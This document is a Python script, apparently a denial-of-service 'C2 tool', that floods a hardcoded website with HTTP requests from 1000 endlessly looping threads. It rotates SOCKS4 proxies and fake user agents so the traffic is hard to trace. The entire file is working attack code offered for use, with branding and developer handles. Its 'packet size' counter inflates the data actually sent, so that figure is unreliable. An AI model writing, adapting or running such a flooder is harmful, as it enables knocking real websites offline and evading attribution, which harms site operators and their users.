import requests
import threading
import random
import time
from colorama import init, Fore, Style

init(autoreset=True)

TARGET_URL = "http://apsdk.com"
THREADS = 1000
PACKET_SIZE = 48129
PROXIES = []

sent_data = 0
lock = threading.Lock()

# Load SOCKS4 proxies from file
def load_proxies():
    with open("proxies.txt", "r") as f:
        for line in f:
            PROXIES.append(line.strip())

# Fake user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

def attack():
    global sent_data
    while True:
        proxy = random.choice(PROXIES) if PROXIES else None
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Length": str(PACKET_SIZE)
        }
        try:
            proxies = {
                "http": f"socks4://{proxy}",
                "https": f"socks4://{proxy}",
            } if proxy else None

            response = requests.get(TARGET_URL, headers=headers, proxies=proxies, timeout=5)
            with lock:
                sent_data += PACKET_SIZE
        except:
            continue

def stats():
    while True:
        with lock:
            print(f"{Fore.CYAN}Data Sent: {sent_data / 1_000_000:.2f} MB | Threads: {THREADS} | Proxies: {len(PROXIES)}", end="\r")
        time.sleep(1)

if __name__ == "__main__":
    print(f"{Fore.YELLOW}RAJPUT C2 TOOL - Premium Edition")
    print(f"{Fore.MAGENTA}Developer: Abhinav / AuraFarmer")
    print(f"{Fore.GREEN}GitHub: FarmingAura | Instagram: Abhinav.ily")
    print(f"{Fore.RED}Targeting: {TARGET_URL}")
    print()

    load_proxies()
    
    # Start stat monitoring thread
    threading.Thread(target=stats, daemon=True).start()

    for _ in range(THREADS):
        threading.Thread(target=attack, daemon=True).start()

    # Keep main thread alive
    while True:
        time.sleep(10)
